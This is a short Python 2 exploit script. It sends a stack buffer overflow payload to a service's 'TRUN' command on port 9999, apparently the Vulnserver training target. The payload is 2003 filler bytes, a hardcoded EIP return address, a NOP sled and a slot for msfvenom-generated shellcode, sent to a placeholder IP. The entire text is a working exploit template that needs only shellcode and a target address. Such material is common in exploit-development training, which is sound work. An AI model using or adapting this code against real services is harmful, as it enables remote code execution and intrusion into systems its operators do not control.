#!/usr/bin/python
import sys, socket

overflow = "YOUR GENERATED SHELLCODE VIA MSFVENOM"

return_address = "\xaf\x11\x50\x62"

# add some padding
nops = "\x90" * 32

# EIP starts with 2003 bytes
shellcode = "A" * 2003 + return_address +  nops + overflow

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("YOUR_IP_ADDRESS", 9999))
    s.send(('TRUN /.:/' + shellcode))
    s.close()
except:
    print "Error connecting to server"
    sys.exit()
